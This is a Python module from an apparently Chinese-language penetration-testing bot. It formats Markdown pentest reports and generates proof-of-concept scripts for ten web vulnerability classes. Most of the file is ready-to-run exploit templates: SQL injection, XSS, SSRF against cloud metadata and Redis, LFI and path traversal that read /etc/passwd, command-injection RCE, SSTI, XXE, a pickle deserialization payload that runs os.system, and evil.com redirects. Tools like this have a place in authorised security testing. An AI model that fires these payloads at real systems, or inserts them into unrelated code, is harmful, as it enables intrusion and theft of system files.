#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""报告 & PoC 生成模块 - 渗透测试报告 + 漏洞 PoC 脚本生成"""

import os
import time
import json
from datetime import datetime
from typing import Optional


def generate_report(target: str, findings: list, metadata: Optional[dict] = None) -> dict:
    """生成渗透测试报告 (Markdown)"""
    if metadata is None:
        metadata = {}

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 按严重程度排序
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings_sorted = sorted(findings, key=lambda x: severity_order.get(x.get("severity", "info"), 9))

    # 统计
    severity_count = {}
    for f in findings:
        sev = f.get("severity", "info")
        severity_count[sev] = severity_count.get(sev, 0) + 1

    # 构建 Markdown
    md = []
    md.append(f"# 渗透测试报告")
    md.append("")
    md.append(f"**目标**: {target}")
    md.append(f"**时间**: {now}")
    md.append(f"**工具**: 浅秋的鱼 Bot 渗透测试框架")
    md.append("")

    # 摘要
    md.append("## 📊 执行摘要")
    md.append("")
    md.append(f"共发现 **{len(findings)}** 个安全问题：")
    md.append("")
    for sev in ["critical", "high", "medium", "low", "info"]:
        if sev in severity_count:
            icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢", "info": "🔵"}[sev]
            label = {"critical": "严重", "high": "高危", "medium": "中危", "low": "低危", "info": "信息"}[sev]
            md.append(f"- {icon} **{label}**: {severity_count[sev]} 个")
    md.append("")

    # 详细发现
    md.append("## 🔍 详细发现")
    md.append("")
    for i, f in enumerate(findings_sorted, 1):
        sev = f.get("severity", "info")
        icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢", "info": "🔵"}.get(sev, "⚪")
        name = f.get("name", f.get("type", "未知漏洞"))
        md.append(f"### {icon} {i}. {name}")
        md.append("")
        md.append(f"- **类型**: {f.get('type', 'N/A')}")
        md.append(f"- **严重程度**: {sev}")
        if "url" in f:
            md.append(f"- **URL**: {f['url']}")
        if "param" in f:
            md.append(f"- **参数**: {f['param']}")
        if "evidence" in f:
            md.append(f"- **证据**: `{f['evidence']}`")
        if "payload" in f:
            md.append(f"- **Payload**: `{f['payload']}`")
        if "description" in f:
            md.append(f"- **描述**: {f['description']}")
        if "remediation" in f:
            md.append(f"- **修复建议**: {f['remediation']}")
        md.append("")

    # 修复建议
    md.append("## 🛡️ 修复建议")
    md.append("")
    md.append("1. 优先修复严重和高危漏洞")
    md.append("2. 对所有用户输入进行严格验证和过滤")
    md.append("3. 实施最小权限原则")
    md.append("4. 定期进行安全审计和渗透测试")
    md.append("5. 部署 WAF 和入侵检测系统")
    md.append("")

    # 声明
    md.append("---")
    md.append("")
    md.append("*本报告由自动化工具生成，仅供授权安全测试参考。*")

    report_md = "\n".join(md)

    return {
        "target": target,
        "generated_at": now,
        "total_findings": len(findings),
        "severity_count": severity_count,
        "report": report_md,
    }


def generate_poc(vuln_type: str, target: str, **kwargs) -> dict:
    """生成漏洞 PoC 脚本"""
    poc_templates = {
        "sqli": _poc_sqli,
        "xss": _poc_xss,
        "ssrf": _poc_ssrf,
        "lfi": _poc_lfi,
        "rce": _poc_rce,
        "ssti": _poc_ssti,
        "xxe": _poc_xxe,
        "deserialization": _poc_deser,
        "path_traversal": _poc_path_traversal,
        "open_redirect": _poc_open_redirect,
    }

    if vuln_type not in poc_templates:
        return {"error": f"不支持的漏洞类型: {vuln_type}", "available": list(poc_templates.keys())}

    poc_code = poc_templates[vuln_type](target, **kwargs)
    filename = f"poc_{vuln_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"

    return {
        "vuln_type": vuln_type,
        "target": target,
        "filename": filename,
        "code": poc_code,
    }


def _poc_sqli(target: str, param: str = "id", **kwargs) -> str:
    """SQL 注入 PoC"""
    return f'''#!/usr/bin/env python3
"""SQL 注入 PoC - {target}"""
import requests

target = "{target}"
param = "{param}"

# 1. 测试布尔盲注
payloads = [
    "' OR '1'='1",
    "' OR '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
]

print(f"[*] 测试目标: {{target}}")
print(f"[*] 参数: {{param}}")
print()

for p in payloads:
    try:
        r = requests.get(target, params={{param: p}}, timeout=10)
        print(f"[+] Payload: {{p}}")
        print(f"    状态码: {{r.status_code}}")
        print(f"    响应长度: {{len(r.text)}}")
        print()
    except Exception as e:
        print(f"[-] 错误: {{e}}")

# 2. UNION 注入测试
union_payload = "' UNION SELECT 1,2,3--"
try:
    r = requests.get(target, params={{param: union_payload}}, timeout=10)
    if "1" in r.text or "2" in r.text or "3" in r.text:
        print("[+] UNION 注入可能存在！")
except Exception as e:
    print(f"[-] UNION 测试错误: {{e}}")
'''


def _poc_xss(target: str, param: str = "q", **kwargs) -> str:
    """XSS PoC"""
    return f'''#!/usr/bin/env python3
"""XSS PoC - {target}"""
import requests

target = "{target}"
param = "{param}"

payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
]

print(f"[*] 测试目标: {{target}}")
print(f"[*] 参数: {{param}}")
print()

for p in payloads:
    try:
        r = requests.get(target, params={{param: p}}, timeout=10)
        if p in r.text:
            print(f"[+] 可能存在 XSS!")
            print(f"    Payload: {{p}}")
            print(f"    状态码: {{r.status_code}}")
            print()
    except Exception as e:
        print(f"[-] 错误: {{e}}")
'''


def _poc_ssrf(target: str, param: str = "url", **kwargs) -> str:
    """SSRF PoC"""
    return f'''#!/usr/bin/env python3
"""SSRF PoC - {target}"""
import requests

target = "{target}"
param = "{param}"

# 测试内网访问
payloads = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_info",
    "dict://127.0.0.1:6379/info",
]

print(f"[*] 测试目标: {{target}}")
print(f"[*] 参数: {{param}}")
print()

for p in payloads:
    try:
        r = requests.get(target, params={{param: p}}, timeout=10)
        print(f"[+] Payload: {{p}}")
        print(f"    状态码: {{r.status_code}}")
        print(f"    响应长度: {{len(r.text)}}")
        if "root:" in r.text or "meta-data" in r.text:
            print(f"    [!] 可能存在 SSRF!")
        print()
    except Exception as e:
        print(f"[-] 错误: {{e}}")
'''


def _poc_lfi(target: str, param: str = "file", **kwargs) -> str:
    """LFI PoC"""
    return f'''#!/usr/bin/env python3
"""LFI PoC - {target}"""
import requests

target = "{target}"
param = "{param}"

payloads = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
]

print(f"[*] 测试目标: {{target}}")
print(f"[*] 参数: {{param}}")
print()

for p in payloads:
    try:
        r = requests.get(target, params={{param: p}}, timeout=10)
        if "root:" in r.text or "<?php" in r.text:
            print(f"[+] 可能存在 LFI!")
            print(f"    Payload: {{p}}")
            print(f"    响应前100字符: {{r.text[:100]}}")
            print()
    except Exception as e:
        print(f"[-] 错误: {{e}}")
'''


def _poc_rce(target: str, param: str = "cmd", **kwargs) -> str:
    """RCE PoC"""
    return f'''#!/usr/bin/env python3
"""RCE PoC - {target}"""
import requests

target = "{target}"
param = "{param}"

payloads = [
    "id",
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "ip addr",
]

print(f"[*] 测试目标: {{target}}")
print(f"[*] 参数: {{param}}")
print()

for p in payloads:
    try:
        r = requests.get(target, params={{param: p}}, timeout=10)
        print(f"[+] 命令: {{p}}")
        print(f"    响应: {{r.text[:200]}}")
        print()
    except Exception as e:
        print(f"[-] 错误: {{e}}")
'''


def _poc_ssti(target: str, param: str = "name", **kwargs) -> str:
    """SSTI PoC"""
    return f'''#!/usr/bin/env python3
"""SSTI PoC - {target}"""
import requests

target = "{target}"
param = "{param}"

# 按模板引擎分类
tests = {{
    "通用": ["{{{{7*7}}}}", "${{7*7}}", "#{{{{7*7}}}}"],
    "Jinja2": ["{{{{config}}}}", "{{{{7*7}}}}"],
    "Twig": ["{{{{7*7}}}}", "{{{{_self.env}}}}"],
    "Smarty": ["{{{{7*7}}}}", "{{{{system('id')}}}}"],
}}

print(f"[*] 测试目标: {{target}}")
print(f"[*] 参数: {{param}}")
print()

for engine, payloads in tests.items():
    for p in payloads:
        try:
            r = requests.get(target, params={{param: p}}, timeout=10)
            if "49" in r.text:
                print(f"[+] 可能存在 SSTI ({{engine}})!")
                print(f"    Payload: {{p}}")
                print(f"    响应: {{r.text[:200]}}")
                print()
        except Exception as e:
            print(f"[-] 错误: {{e}}")
'''


def _poc_xxe(target: str, **kwargs) -> str:
    """XXE PoC"""
    return f'''#!/usr/bin/env python3
"""XXE PoC - {target}"""
import requests

target = "{target}"

payloads = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
]

headers = {{"Content-Type": "application/xml"}}

print(f"[*] 测试目标: {{target}}")
print()

for p in payloads:
    try:
        r = requests.post(target, data=p, headers=headers, timeout=10)
        if "root:" in r.text or "base64" in r.text.lower():
            print(f"[+] 可能存在 XXE!")
            print(f"    Payload: {{p[:80]}}...")
            print(f"    响应: {{r.text[:200]}}")
            print()
    except Exception as e:
        print(f"[-] 错误: {{e}}")
'''


def _poc_deser(target: str, **kwargs) -> str:
    """反序列化 PoC"""
    return f'''#!/usr/bin/env python3
"""反序列化 PoC - {target}"""
import requests
import pickle
import base64

target = "{target}"

# Python pickle RCE payload
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ("id",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()

print(f"[*] 测试目标: {{target}}")
print(f"[*] Pickle Payload (base64): {{payload}}")
print()

try:
    r = requests.post(target, data=payload, timeout=10)
    print(f"[+] 状态码: {{r.status_code}}")
    print(f"[+] 响应: {{r.text[:200]}}")
except Exception as e:
    print(f"[-] 错误: {{e}}")
'''


def _poc_path_traversal(target: str, param: str = "file", **kwargs) -> str:
    """路径穿越 PoC"""
    return f'''#!/usr/bin/env python3
"""路径穿越 PoC - {target}"""
import requests

target = "{target}"
param = "{param}"

payloads = [
    "../../../../etc/passwd",
    "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

print(f"[*] 测试目标: {{target}}")
print(f"[*] 参数: {{param}}")
print()

for p in payloads:
    try:
        r = requests.get(target, params={{param: p}}, timeout=10)
        if "root:" in r.text or "[extensions]" in r.text:
            print(f"[+] 可能存在路径穿越!")
            print(f"    Payload: {{p}}")
            print(f"    响应: {{r.text[:200]}}")
            print()
    except Exception as e:
        print(f"[-] 错误: {{e}}")
'''


def _poc_open_redirect(target: str, param: str = "url", **kwargs) -> str:
    """开放重定向 PoC"""
    return f'''#!/usr/bin/env python3
"""开放重定向 PoC - {target}"""
import requests

target = "{target}"
param = "{param}"

payloads = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "javascript:alert(1)",
]

print(f"[*] 测试目标: {{target}}")
print(f"[*] 参数: {{param}}")
print()

for p in payloads:
    try:
        r = requests.get(target, params={{param: p}}, allow_redirects=False, timeout=10)
        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            if "evil.com" in loc or "javascript" in loc:
                print(f"[+] 可能存在开放重定向!")
                print(f"    Payload: {{p}}")
                print(f"    Location: {{loc}}")
                print()
    except Exception as e:
        print(f"[-] 错误: {{e}}")
'''


def poc_list() -> dict:
    """列出所有支持的 PoC 类型"""
    return {
        "sqli": "SQL 注入",
        "xss": "跨站脚本",
        "ssrf": "服务端请求伪造",
        "lfi": "本地文件包含",
        "rce": "远程代码执行",
        "ssti": "模板注入",
        "xxe": "XML 外部实体",
        "deserialization": "反序列化",
        "path_traversal": "路径穿越",
        "open_redirect": "开放重定向",
    }


def save_report(report: dict, output_dir: str = "/tmp/reports") -> str:
    """保存报告到文件"""
    os.makedirs(output_dir, exist_ok=True)
    target_safe = report["target"].replace("://", "_").replace("/", "_")
    filename = f"report_{target_safe}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    filepath = os.path.join(output_dir, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(report["report"])
    return filepath


def save_poc(poc: dict, output_dir: str = "/tmp/pocs") -> str:
    """保存 PoC 到文件"""
    os.makedirs(output_dir, exist_ok=True)
    filepath = os.path.join(output_dir, poc["filename"])
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(poc["code"])
    return filepath
